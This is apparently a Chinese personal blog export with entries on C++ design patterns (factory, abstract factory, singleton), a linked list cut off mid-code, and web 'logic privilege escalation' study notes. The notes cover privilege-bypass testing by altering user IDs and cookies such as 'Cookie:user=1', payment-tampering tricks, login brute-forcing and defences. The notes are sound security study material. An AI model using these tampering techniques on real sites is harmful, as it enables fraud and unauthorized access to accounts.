class="title">doSomething</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ConcreteProductA</span> : <span class="keyword">public</span> Product &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">doSomething</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;ConcreteProductA::doSomething()\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ConcreteProductB</span> : <span class="keyword">public</span> Product &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">doSomething</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;ConcreteProductB::doSomething()\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Creator</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">virtual</span> ~<span class="built_in">Creator</span>() &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> std::unique_ptr&lt;Product&gt; <span class="title">createProduct</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ConcreteCreatorA</span> : <span class="keyword">public</span> Creator &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">std::unique_ptr&lt;Product&gt; <span class="title">createProduct</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> std::<span class="built_in">make_unique</span>&lt;ConcreteProductA&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ConcreteCreatorB</span> : <span class="keyword">public</span> Creator &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">std::unique_ptr&lt;Product&gt; <span class="title">createProduct</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> std::<span class="built_in">make_unique</span>&lt;ConcreteProductB&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ConcreteCreatorA creatorA;</span><br><span class="line">    <span class="keyword">auto</span> productA = creatorA.<span class="built_in">createProduct</span>();</span><br><span class="line">    productA-&gt;<span class="built_in">doSomething</span>();</span><br><span class="line"></span><br><span class="line">    ConcreteCreatorB creatorB;</span><br><span class="line">    <span class="keyword">auto</span> productB = creatorB.<span class="built_in">createProduct</span>();</span><br><span class="line">    productB-&gt;<span class="built_in">doSomething</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>ConcreteProductA::doSomething()<br>ConcreteProductB::doSomething()</p>
</blockquote>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>抽象基类Product：定义要创建的接口，<code>doSomething</code>纯虚函数，定义具体产品必须实现的功能</p>
<p>ConcreteProductA&#x2F;ConcreteProductB:这些是Product接口的具体实现，重写<code>doSomething</code>来为各自的产品提供特定行为</p>
<p>抽象基类Creator：<code>createproduct</code>方法返回了一个指向新创建产品的指针，包装在(unique_ptr智能指针中)。该类充当创建产品的接口</p>
<p>ConcreteCreatorA&#x2F;ConcreteCreatorB：Creator接口的具体实现，重写 <code>createProduct</code>方法实例化并返回具体产品的特定实例</p>
<p>main函数：创建 ConcreteCreatorA 和 ConcreteCreatorB 的实例，调用<code>createproduct</code>方法，去创建各自的产品；然后用这些产品去调用各自的<code>doSomething</code>方法</p>
<p>其实就是供客户选择：比如可乐，看是选择百事牌制作，还是选择可口牌制作。</p>
<p>具体的工厂-&gt;具体的产品-&gt;具体的行为(选择了百事工厂(<code>具体的creator</code>)，选择百事可乐(<code>具体的product</code>)，得到百事可乐(<code>dosomething()</code>))。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>允许客户代码通过工厂接口来创建产品，而不需要直接与具体产品类进行交互</p>
<p>该模式仅局限于一类；Product是一类，有个共同基类；如果为不同类提供一个对象创建的接口呢？</p>
<h2 id="2-AbstactFactory-模式（抽象工厂）"><a href="#2-AbstactFactory-模式（抽象工厂）" class="headerlink" title="2.AbstactFactory 模式（抽象工厂）"></a>2.AbstactFactory 模式（抽象工厂）</h2><h3 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h3><p>造电脑为例；如果将CPU和主板抽象，cpu由cpufactory生产，主板由mbfactory生产</p>
<p>客户端调用为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//java语言</span></span><br><span class="line"><span class="comment">// 得到 Intel 的 CPU</span></span><br><span class="line"><span class="type">CPUFactory</span> <span class="variable">cpuFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntelCPUFactory</span>();</span><br><span class="line"><span class="type">CPU</span> <span class="variable">cpu</span> <span class="operator">=</span> intelCPUFactory.makeCPU();</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 得到 AMD 的主板</span></span><br><span class="line"><span class="type">MainBoardFactory</span> <span class="variable">mainBoardFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AmdMainBoardFactory</span>();</span><br><span class="line"><span class="type">MainBoard</span> <span class="variable">mainBoard</span> <span class="operator">=</span> mainBoardFactory.make();</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 组装 CPU 和主板</span></span><br><span class="line"><span class="type">Computer</span> <span class="variable">computer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Computer</span>(cpu, mainBoard);</span><br></pre></td></tr></table></figure>

<p>但是，因特尔的cpu和AMD的主板不兼容使用，导致代码出错，但用户不知道这件事，所以随意组合还是不稳妥。</p>
<p>因此，引入<code>产品族</code>这一概念，产品族是指由<strong>同一个工厂</strong>生产的,位于不同产品等级结构中的一组产品</p>
<p>所以不再定义cpu工厂、主板工厂；而是直接定义<code>电脑工厂</code>，每个电脑工厂负责所有的设备生产，杜绝了不兼容问题。</p>
<p>那么用户的调用就是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//java语言</span></span><br><span class="line"><span class="comment">//定义电脑工厂，比如英特尔</span></span><br><span class="line">cpfactory cp=<span class="keyword">new</span> <span class="title class_">Intelfactory</span>();</span><br><span class="line"><span class="comment">//生产它的cpu</span></span><br><span class="line">Cpu cpu=cp.makecpu();</span><br><span class="line"><span class="comment">//生产该工厂的主板</span></span><br><span class="line">Mainboard mb=cp.makemb();</span><br><span class="line"><span class="comment">//生产硬盘啊...</span></span><br><span class="line">....</span><br><span class="line"><span class="comment">//组装啊</span></span><br><span class="line"><span class="type">Computer</span> <span class="variable">computer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Computer</span>(cpu, mb,...);</span><br></pre></td></tr></table></figure>

<h3 id="解决的问题-1"><a href="#解决的问题-1" class="headerlink" title="解决的问题"></a>解决的问题</h3><p>为不同类提供一个对象创建的接口</p>
<h3 id="该模式重要的功能"><a href="#该模式重要的功能" class="headerlink" title="该模式重要的功能"></a>该模式重要的功能</h3><p>将一组相关的产品组织在一起，可以确保产品之间的兼容性</p>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//cpu</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cpu</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="keyword">virtual</span> ~<span class="built_in">cpu</span>()&#123;&#125;</span><br><span class="line">   <span class="function"><span class="keyword">virtual</span> std::string <span class="title">getname</span><span class="params">()</span></span>=<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">intelcpu</span>:<span class="keyword">public</span> cpu&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="function">std::string <span class="title">getname</span><span class="params">()</span> <span class="keyword">override</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Intel cpu&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">admcpu</span>:<span class="keyword">public</span> cpu&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="function">std::string <span class="title">getname</span><span class="params">()</span> <span class="keyword">override</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Adm cpu&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//mb</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">mainboard</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="keyword">virtual</span> ~<span class="built_in">mainboard</span>() &#123;&#125;</span><br><span class="line">   <span class="function"><span class="keyword">virtual</span> std::string <span class="title">getmodel</span><span class="params">()</span></span>=<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">intelmainborad</span>:<span class="keyword">public</span> mainboard&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="function">std::string <span class="title">getmodel</span><span class="params">()</span> <span class="keyword">override</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Intel mainborad&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">admmainborad</span>:<span class="keyword">public</span> mainboard&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="function">std::string <span class="title">getmodel</span><span class="params">()</span> <span class="keyword">override</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Adm mainborad&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//factory</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">computerfactory</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="keyword">virtual</span> ~<span class="built_in">computerfactory</span>()&#123;&#125;</span><br><span class="line">   <span class="function"><span class="keyword">virtual</span> cpu* <span class="title">createcpu</span><span class="params">()</span></span>=<span class="number">0</span>;</span><br><span class="line">   <span class="function"><span class="keyword">virtual</span> mainboard* <span class="title">createmainboard</span><span class="params">()</span></span>=<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">intelcomputerfactory</span>:<span class="keyword">public</span> computerfactory&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="function">cpu* <span class="title">createcpu</span><span class="params">()</span> <span class="keyword">override</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">intelcpu</span>();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function">mainboard* <span class="title">createmainboard</span><span class="params">()</span> <span class="keyword">override</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">intelmainborad</span>();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">admcomputerfactory</span>:<span class="keyword">public</span> computerfactory&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="function">cpu* <span class="title">createcpu</span><span class="params">()</span> <span class="keyword">override</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">admcpu</span>();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function">mainboard* <span class="title">createmainboard</span><span class="params">()</span> <span class="keyword">override</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">admmainborad</span>();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//客户端代码</span></span><br><span class="line">    <span class="comment">//选择一个intel厂家</span></span><br><span class="line">    intelcomputerfactory infac;</span><br><span class="line">    cpu* cp=infac.<span class="built_in">createcpu</span>();</span><br><span class="line">    mainboard* mb=infac.<span class="built_in">createmainboard</span>();</span><br><span class="line"></span><br><span class="line">   std::cout&lt;&lt;<span class="string">&quot;cpu: &quot;</span>&lt;&lt;cp-&gt;<span class="built_in">getname</span>()&lt;&lt;<span class="string">&quot;, mainboard: &quot;</span>&lt;&lt;mb-&gt;<span class="built_in">getmodel</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>抽象产品：<strong>cpu</strong>和<strong>mainboard</strong>，是抽象产品，定义了接口</p>
<p>具体产品：<strong>intelcpu</strong>、<strong>intelmainboard</strong>、<strong>admcpu</strong>、<strong>admmainboard</strong>，分别实现了抽象产品的接口</p>
<p>抽象工厂：<strong>computerfactory</strong>，是抽象工厂，定义了创建抽象产品的<code>接口方法</code></p>
<p>具体工厂：<strong>intelcomputerfactory</strong>和 <strong>admcomputerfactory</strong>是具体工厂，分别实现了抽象工厂接口方法，用于创建具体产品的实例。</p>
<p>main函数：即客户端代码，选择了具体工厂<strong>intelcomputerfactory</strong>实例，通过调用方法 <code>createcpu``和createmainboard</code> 生产了特定的产品对象cpu和mainboard</p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>问题就是，比如再加个设备，加个显示器，需要修改所有工厂，为它们都加上制造显示器的方法。违反 <strong>对修改关闭，对扩展开放</strong> 的设计原则</p>
<table>
<thead>
<tr>
<th>关注点</th>
<th>工厂模式</th>
<th>抽象工厂模式</th>
</tr>
</thead>
<tbody><tr>
<td>关注点</td>
<td>创建<strong>单个对象</strong>，在一个抽象的工厂类中声明<strong>一个</strong>工厂方法，具体的子类负责实现这个方法来创建特定的产品对象</td>
<td>创建<strong>一组相关对象</strong>，在一个抽象的工厂类中声明<strong>多个</strong>工厂方法，每个方法用于创建一类产品对象</td>
</tr>
<tr>
<td>产品结构</td>
<td>适用于一组具有相似结构的产品，每个具体工厂类负责创建一个具体产品类</td>
<td>适用于一组相关的产品，每个具体工厂类负责创建一组具有相关性的产品，这些产品可能在不同的维度上有关联</td>
</tr>
<tr>
<td>扩展性</td>
<td>新增产品种类较为容易，只需要创建新的具体产品类和对应的具体工厂类</td>
<td>新增产品族较为容易，只需要创建新的一组具体产品类和对应的具体工厂类</td>
</tr>
</tbody></table>
<h2 id="3-Singleton-模式（-单例模式）"><a href="#3-Singleton-模式（-单例模式）" class="headerlink" title="3.Singleton 模式（ 单例模式）"></a>3.Singleton 模式（ 单例模式）</h2><p>指在内存中只会创建且仅创建一次对象的设计模式，当程序中其他地方需要使用到该对象的相同功能时，都会调用创建好的这一个，不会再额外创建实例，这样做的好处就是避免过多的创建相同作用的对象使得内存浪费。</p>
<p><strong>实现单例模式的步骤：</strong><br>1、构造函数私有化<br>2、增加静态私有的当前类的指针变量<br>3、提供静态对外接口,可以让用户获得单例对象</p>
<p>单例模式分类：</p>
<blockquote>
<p><strong>懒汉式</strong>：解决了饿汉式内存浪费问题，但是线程不安全的，可以通过互斥量mutex.lock()和mutex.unlock()来解决（程序调用时创建实例）<br><strong>饿汉式</strong>：还没有使用该单例对象，该单例对象就已经被加载到内存了，在对象过多时会造成内存浪费（程序加载时就创建好实例，等待调用）</p>
</blockquote>
<h3 id="解决的问题-2"><a href="#解决的问题-2" class="headerlink" title="解决的问题"></a>解决的问题</h3><p>在程序中<strong>多次使用同一个对象且作用相同</strong>时，为了防止频繁地创建对象使得内存飙升，单例模式可以让程序仅在内存中<strong>创建一个对象</strong>，让所有需要调用的地方都共享这一单例对象。</p>
<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><h4 id="懒汉式创建单例对象"><a href="#懒汉式创建单例对象" class="headerlink" title="懒汉式创建单例对象"></a>懒汉式创建单例对象</h4><p>懒汉式创建对象的方法是在程序使用对象前，先判断该对象是否已经实例化<strong>（判空），</strong>若已实例化直接返回该类对象。，否则则先执行实例化操作。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">static</span> Singleton* singleton;</span><br><span class="line">    <span class="built_in">Singleton</span>()&#123;&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> Singleton* <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (singleton ==<span class="literal">nullptr</span>) &#123;</span><br><span class="line">            singleton = <span class="keyword">new</span> <span class="built_in">Singleton</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>缺点：多线程时，同时进入if判断，会导致被实例化两个对象</p>
<h4 id="饿汉式创建单例对象"><a href="#饿汉式创建单例对象" class="headerlink" title="饿汉式创建单例对象"></a>饿汉式创建单例对象</h4><p>饿汉式在<strong>类加载</strong>时已经创建好该对象，在程序调用时<strong>直接返回</strong>该单例对象即可，即我们在编码时就已经指明了要马上创建这个对象，<strong>不需要等到被调用时再去创建</strong>。</p>
<p>以下代码为java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Singleton</span> <span class="variable">singleton</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>c++版本</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">   <span class="type">static</span> Singleton* instence;</span><br><span class="line">   <span class="built_in">Singleton</span>() &#123;&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">     <span class="function"><span class="type">static</span> Singleton* <span class="title">getInstence</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> instence;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">freespace</span><span class="params">()</span></span>&#123;</span><br><span class="line">         <span class="keyword">if</span>(instence!=<span class="literal">NULL</span>) <span class="keyword">delete</span> instence;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><ul>
<li>Singleton 不可以被实例化，因此将其构造函数声明private</li>
<li>Singleton 模式经常和 Factory（AbstractFactory）模式在一起使用，因为系统中工厂对象一般来说只要一个</li>
</ul>
<p>CSDN<a href="http://t.csdn.cn/7IKWt">小菠萝的IT之旅</a></p>
<p><a href="https://www.yii666.com/blog/395092.html">https://www.yii666.com/blog/395092.html</a></p>
<h1 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h1><p><a href="https://zhuanlan.zhihu.com/p/580211159">知乎</a></p>
<p>CSDN:<a href="http://t.csdn.cn/gfYaN">toBetterMe</a></p>
<p>CSDN:<a href="http://t.csdn.cn/IHv5E">yingjiejk</a></p>
<p><a href="https://www.yii666.com/blog/395092.html">https://www.yii666.com/blog/395092.html</a></p>
]]></content>
      <categories>
        <category>C++</category>
        <category>代码设计模式</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>创建型</tag>
        <tag>结构型</tag>
        <tag>行为模式</tag>
      </tags>
  </entry>
  <entry>
    <title>逻辑越权</title>
    <url>/2023/05/22/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/</url>
    <content><![CDATA[<h1 id="1-水平垂直越权"><a href="#1-水平垂直越权" class="headerlink" title="1.水平垂直越权"></a>1.水平垂直越权</h1><p>垂直越权访问指：使用低权限身份的账号，能发送高权限账号才能有的请求，获得其高权限的操作。</p>
<p>水平越权访问指：某用户能获取另一个同级别用户的操作</p>
<p>未授权访问：通过删除请求中的认证信息后重放该请求，依然可以完成操作（任何人都可以操作它）</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul>
<li><p>前端安全造成：界面；</p>
<p>判断用户等级后，代码界面部分进行可选显示。</p>
<p>纠正：根据用户等级，应该判断某些功能执不执行；给不给显示<strong>不等于</strong>功能没有</p>
</li>
<li><p>后端安全造成：数据库；</p>
<p>​	user表（管理员与普通用户同表）</p>
<p>​			id,username,password,usertype</p>
<p>​			1,	admin	, 12321321, 	1</p>
<p>​			2,	test		,	1211111,	2</p>
<p>代码通过usertype验证级别。</p>
<p><strong>如果在访问网站数据包中有传输用户的编号、用户组编号或类型编号的时候，那么尝试对这个值进行修改，就是测试越权漏洞的基本。</strong></p>
</li>
</ul>
<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>pikachu：只判断了登录状态，没有验证级别，因此存在越权</p>
<p>越权检测（小米范工具）</p>
<p>越权检测（burpsuite的插件Authz）</p>
<h3 id="tip"><a href="#tip" class="headerlink" title="tip"></a>tip</h3><p>注册用户时，提示该用户已存在，就可以尝试利用该用户名。</p>
<p>垂直越权：添加用户的前提：</p>
<p>普通用户前端有操作界面可以抓取数据包</p>
<p>通过网站源码本地搭建自己模拟抓取</p>
<p>盲猜</p>
<p>重点关注：url参数和cookie参数如(uid、id)</p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>前后端同时对用户输入信息校验</p>
<p>调用功能（执行关键操作）前验证用户是否有该权限</p>
<p>直接对象引用的加密资源ID、防止攻击者枚举ID、敏感数据特殊化处理</p>
<p>永远不要相信用户的输入，对于可控参数进行严格检查与过滤</p>
<h1 id="2-登录脆弱及支付篡改"><a href="#2-登录脆弱及支付篡改" class="headerlink" title="2.登录脆弱及支付篡改"></a>2.登录脆弱及支付篡改</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="HTTP与HTTPS"><a href="#HTTP与HTTPS" class="headerlink" title="HTTP与HTTPS"></a>HTTP与HTTPS</h3><p>超文本传输协议HTTP协议被用于在Web浏览器和网站服务器之间传递信息，HTTP协议以明文方式发送内容，不提供任何方式的数据加密，如果攻击者截取了Web浏览器和网站服务器之间的传输报文，就可以直接读懂其中的信息。</p>
<p>安全套接字层超文本传输协议HTTPS，为了数据传输的安全，HTTPS在HTTP的基础上加入了SSL协议，SSL依靠证书来验证服务器的身份，并为浏览器和服务器之间的通信加密。HTTPS加密过程：</p>
<ol>
<li><p><strong>客户端发起HTTPS请求</strong></p>
</li>
<li><p><strong>服务器回复公共证书</strong>（采用HTTPS协议的服务器必须要有一套数字证书，可以自己制作，也可以向组织申请，区别就是自己颁发的证书需要客户端验证通过，才可以继续访问，而使用受信任的公司申请的证书则不会弹出提示页面，<strong>这套证书相当于公钥和私钥</strong>）</p>
</li>
<li><p><strong>客户端解析证书</strong>（这部分工作由客户端的TLS来完成的，首先会验证公钥是否有效，比如颁发机构，过期时间等等，如果发现异常，则会弹出一个警告框，提示证书存在问题。</p>
<p>如果证书没有问题，那么<strong>就生成一个随机值，然后用证书对该随机值进行加密</strong>，就好像上面说的，把随机值用锁头锁起来，这样除非有钥匙，不然看不到被锁住的内容）</p>
</li>
<li><p><strong>传送加密信息</strong>（<strong>传送的是用证书加密后的随机值，目的就是让服务端得到这个随机值</strong>，以后客户端和服务端的通信就可以通过这个随机值来进行加密解密了）</p>
</li>
<li><p><strong>服务器端解密信息</strong>（服务端用私钥解密后，得到了客户端传过来的随机值(私钥)，然后<strong>把内容通过该值</strong>进行<strong>对称加密</strong>，即将信息和私钥通过某种算法混合在一起，这样除非知道私钥，不然无法获取内容，而正好客户端和服务端都知道这个私钥，所以只要加密算法够彪悍，私钥够复杂，数据就够安全）</p>
</li>
<li><p><strong>服务器端传输加密后的信息</strong></p>
</li>
<li><p><strong>客户端解密信息</strong>（客户端用之前生成的私钥解密服务段传过来的信息，于是获取了解密后的内容）</p>
</li>
</ol>
<h3 id="SSL协议"><a href="#SSL协议" class="headerlink" title="SSL协议"></a>SSL协议</h3><p>是在传输通信协议（TCP&#x2F;IP）上实现的一种安全协议，采用公开密钥技术，SSL广泛支持各种类型的网络，同时提供三种基本的安全服务，它们都使用公开密钥技术。</p>
<p>其作用为：</p>
<p>（1）、认证用户和服务器，确保数据发送到正确的客户机和服务器；</p>
<p>（2）、加密数据以防止数据中途被窃取；</p>
<p>（3）、维护数据的完整性，确保数据在传输过程中不被改变。</p>
<h3 id="商品业务"><a href="#商品业务" class="headerlink" title="商品业务"></a>商品业务</h3><p>参考网站：<a href="https://www.secpulse.com/archives/67080.html">https://www.secpulse.com/archives/67080.html</a></p>
<h4 id="商品购买流程"><a href="#商品购买流程" class="headerlink" title="商品购买流程"></a>商品购买流程</h4><p>选择商品和数量-&gt;选择支付及配送方式-&gt;生成订单编号-&gt;订单支付选择-&gt;完成支付</p>
<h4 id="常见篡改参数"><a href="#常见篡改参数" class="headerlink" title="常见篡改参数"></a>常见篡改参数</h4><p>商品编号ID，购买价值，购买数量，支付方式，订单号，支付状态等</p>
<h4 id="常见修改方法"><a href="#常见修改方法" class="headerlink" title="常见修改方法"></a>常见修改方法</h4><p>替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等</p>
<h2 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h2><p>HTTP&#x2F;HTTPS协议密文抓取：f12或bp</p>
<p>后台登录账号密码爆破测试：指弱口令爆破，一般已知账号，爆破密码，如果加密，找到加密的算法。</p>
<p>Cookie脆弱点验证修改测试：如Cookie:user&#x3D;1;</p>
<ol>
<li>登录点暴力破解</li>
<li>HTTP&#x2F;HTTPS传输</li>
<li>Cookie脆弱点验证</li>
<li>Session固定点测试</li>
<li>验证密文比对安全测试</li>
</ol>
<h1 id="3-找回机制及接口安全"><a href="#3-找回机制及接口安全" class="headerlink" title="3.找回机制及接口安全"></a>3.找回机制及接口安全</h1><h1 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h1>]]></content>
      <categories>
        <category>逻辑越权</category>
        <category>WEB漏洞</category>
      </categories>
      <tags>
        <tag>逻辑越权</tag>
      </tags>
  </entry>
  <entry>
    <title>链表</title>
    <url>/2023/07/02/%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//定义一个结点模板</span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">struct Node &#123;</span><br><span class="line">	T data;</span><br><span class="line">	Node *next;</span><br><span class="line">	Node() : next(nullptr) &#123;&#125;</span><br><span class="line">	Node(const T &amp;d) : data(d), next(nullptr) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//删除 p 结点后面的元素</span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">void Remove(Node&lt;T&gt; *p) &#123;</span><br><span class="line">	if (p == nullptr || p-&gt;next == nullptr) &#123;</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	auto tmp = p-&gt;next-&gt;next;</span><br><span class="line">	delete p-&gt;next;</span><br><span class="line">	p-&gt;next = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//在 p 结点后面插入元素</span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">void Insert(Node&lt;T&gt; *p, const T &amp;data) &#123;</span><br><span class="line">	auto tmp = new Node&lt;T&gt;(data);</span><br><span class="line">	tmp-&gt;next = p-&gt;next;</span><br><span class="line">	p-&gt;next = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//遍历链表</span><br><span class="line">template&lt;typename T, typename V&gt;</span><br><span class="line">void Walk(Node&lt;T&gt; *p, const V &amp;vistor) &#123;</span><br><span class="line">	while(p != nullptr) &#123;</span><br><span class="line">		vistor(p);</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() 